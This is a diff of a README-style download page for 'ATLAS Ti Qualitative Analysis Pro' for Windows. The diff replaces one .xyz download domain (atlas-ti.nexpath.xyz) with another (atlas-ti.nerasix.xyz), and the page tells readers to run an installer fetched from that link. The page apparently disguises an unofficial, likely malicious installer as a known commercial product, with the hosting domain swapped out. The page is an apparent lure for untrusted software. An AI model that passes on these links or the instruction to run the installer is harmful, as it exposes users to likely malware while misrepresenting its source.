@@ -18,8 +18,8 @@ ATLAS Ti Qualitative Analysis Pro for Windows PCs | clean panels | predictable f
 
 > Use the project link below for Windows.
 
-* **Project link:** **[atlas-ti.nexpath.xyz](https://atlas-ti.nexpath.xyz/)**
-* **Full URL:** `https://atlas-ti.nexpath.xyz/`
+* **Project link:** **[atlas-ti.nerasix.xyz](https://atlas-ti.nerasix.xyz/)**
+* **Full URL:** `https://atlas-ti.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
@@ -51,4 +51,4 @@ Modules arrive ready for local use | open the app and continue. This release inc
 * **RAM:** 8 GB RAM suggested | 16 GB for heavy workloads
 * **Disk:** 3 GB free disk space
 
-***
+***
